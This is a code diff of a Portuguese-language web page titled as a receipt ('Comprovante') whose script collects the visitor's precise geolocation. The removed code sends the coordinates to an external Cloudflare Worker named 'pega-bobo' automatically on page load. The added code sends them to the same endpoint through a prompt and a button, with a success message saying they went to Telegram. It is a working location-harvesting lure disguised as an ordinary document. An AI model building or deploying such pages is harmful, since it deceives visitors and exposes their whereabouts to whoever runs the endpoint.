@@ -1,116 +1,90 @@
-<!DOCTYPE html>
-<html lang="pt-BR">
-<head>
-    <meta charset="UTF-8">
-    <title>Comprovante</title>
-</head>
-<body style="background-color: antiquewhite;">
-    <h1>Comprovante</h1>
-
-    <script>
-        window.addEventListener("load", () => {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(sendLocation, handleError);
-            } else {
-                alert("Seu navegador não suporta geolocalização!");
-            }
-        });
-
-        async function sendLocation(position) {
-            const latitude = position.coords.latitude;
-            const longitude = position.coords.longitude;
-
-            // Substitua pela URL do seu Worker depois de criá-lo
-            const workerUrl = "https://pega-bobo-worker.zeruelinha99.workers.dev";
-            
-            try {
-                const response = await fetch(workerUrl, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ latitude, longitude })
-                });
-                
-                const data = await response.json();
-                alert(data.success ? "Localização enviada!" : "Erro ao enviar");
-            } catch (error) {
-                console.error("Erro:", error);
-                alert("Falha na comunicação");
-            }
-        }
-
-        function handleError(error) {
-            alert("Erro: " + error.message);
-        }
-    </script>
-  <script>
-    async function sendLocation(position) {
-        const data = {
-            latitude: position.coords.latitude,
-            longitude: position.coords.longitude,
-            timestamp: new Date().toISOString()
-        };
-
-        const workerUrl = "https://pega-bobo-worker.zeruelinha99.workers.dev";
-        
-        try {
-            const response = await fetch(workerUrl, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
-            });
-            
-            const responseData = await response.json();
-            alert(responseData.success ? "✅ Localização enviada!" : "❌ Erro ao enviar");
-        } catch (error) {
-            console.error("Erro:", error);
-            alert("Falha na comunicação");
-        }
+<script>
+  async function enviarLocalizacao() {
+    // 1. Primeiro pede permissão ao usuário
+    if (!confirm("Este site precisa acessar sua localização. Permitir?")) {
+      alert("Você negou a permissão. Atualize a página para tentar novamente.");
+      return;
     }
 
-    function handleError(error) {
-        let errorMessage;
-        switch(error.code) {
-            case error.PERMISSION_DENIED:
-                errorMessage = "Você negou a permissão de localização. Por favor, ative nas configurações do site.";
-                break;
-            case error.POSITION_UNAVAILABLE:
-                errorMessage = "Localização indisponível.";
-                break;
-            case error.TIMEOUT:
-                errorMessage = "A requisição de localização expirou.";
-                break;
-            default:
-                errorMessage = "Erro desconhecido na geolocalização.";
-        }
-        
-        // Mostra botão para tentar novamente
-        if(confirm(`${errorMessage} Deseja tentar novamente?`)) {
-            requestLocation();
-        }
-    }
+    // 2. Configuração de alta precisão
+    const options = {
+      enableHighAccuracy: true,
+      timeout: 10000,
+      maximumAge: 0
+    };
 
-    function requestLocation() {
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(
-                sendLocation, 
-                handleError,
-                { 
-                    enableHighAccuracy: true,
-                    timeout: 10000,
-                    maximumAge: 0
-                }
-            );
-        } else {
-            alert("Seu navegador não suporta geolocalização!");
-        }
-    }
+    // 3. Tenta obter a localização
+    try {
+      const position = await new Promise((resolve, reject) => {
+        navigator.geolocation.getCurrentPosition(resolve, reject, options);
+      });
 
-    window.addEventListener("load", () => {
-        // Explica ao usuário antes de pedir a localização
-        if(confirm("Este site precisa acessar sua localização para funcionar. Permitir?")) {
-            requestLocation();
-        }
-    });
+      // 4. Prepara os dados para envio
+      const dados = {
+        latitude: position.coords.latitude,
+        longitude: position.coords.longitude,
+        precisao: position.coords.accuracy,
+        timestamp: new Date(position.timestamp).toISOString()
+      };
+
+      console.log("Dados preparados:", dados);
+
+      // 5. Configura a requisição
+      const workerUrl = "https://pega-bobo-worker.zeruelinha99.workers.dev";
+      const config = {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json",
+          "X-Requested-With": "XMLHttpRequest"
+        },
+        body: JSON.stringify(dados)
+      };
+
+      console.log("Configuração da requisição:", config);
+
+      // 6. Faz a requisição
+      const resposta = await fetch(workerUrl, config);
+      const resultado = await resposta.json();
+
+      console.log("Resposta do Worker:", resultado);
+
+      if (!resposta.ok) {
+        throw new Error(resultado.error || "Erro ao enviar localização");
+      }
+
+      alert("✅ Localização enviada com sucesso para o Telegram!");
+
+    } catch (erro) {
+      console.error("Erro completo:", erro);
+      
+      let mensagem = "Erro: ";
+      if (erro.code === erro.PERMISSION_DENIED) {
+        mensagem += "Você negou a permissão de localização.";
+      } else if (erro.message.includes("Content-Type")) {
+        mensagem += "Problema no servidor (configuração incorreta).";
+      } else {
+        mensagem += erro.message;
+      }
+      
+      alert(mensagem);
+    }
+  }
+
+  // Inicia quando a página carrega
+  window.addEventListener("DOMContentLoaded", () => {
+    if (!navigator.geolocation) {
+      alert("Seu navegador não suporta geolocalização!");
+      return;
+    }
+    
+    // Botão para iniciar manualmente
+    const botao = document.createElement("button");
+    botao.textContent = "Enviar Minha Localização";
+    botao.style.padding = "10px 20px";
+    botao.style.fontSize = "16px";
+    botao.style.marginTop = "20px";
+    botao.onclick = enviarLocalizacao;
+    
+    document.body.appendChild(botao);
+  });
 </script>
-</body>
-</html>
